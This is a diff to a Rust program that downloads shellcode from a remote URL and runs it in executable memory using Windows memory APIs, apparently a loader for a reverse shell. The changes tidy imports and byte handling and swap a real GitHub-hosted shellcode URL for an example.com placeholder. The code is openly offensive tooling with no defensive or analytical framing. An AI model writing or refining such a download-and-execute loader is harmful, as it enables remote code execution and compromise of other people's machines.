@@ -1,7 +1,6 @@
 use std::io::Cursor;
-use std::process::Command;
 use reqwest;
-use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
+use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
 use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
 
 fn download_shellcode(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
@@ -12,7 +11,7 @@ fn download_shellcode(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> 
     if response.status().is_success() {
         // Read the response body (shellcode) into a vector
         let shellcode = response.bytes()?;
-        Ok(shellcode.into_iter().collect())
+        Ok(shellcode.to_vec())
     } else {
         Err("Failed to download shellcode".into())
     }
@@ -59,7 +58,7 @@ fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn std::error::Error>>
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     // URL of the remote shellcode binary
-    let url = "https://raw.githubusercontent.com/Erez-Goldberg/Rust-reverse-shell/main/shellcode.bin";
+    let url = "https://example.com/shellcode.bin";
 
     // Download the shellcode binary
     let shellcode = download_shellcode(url)?;
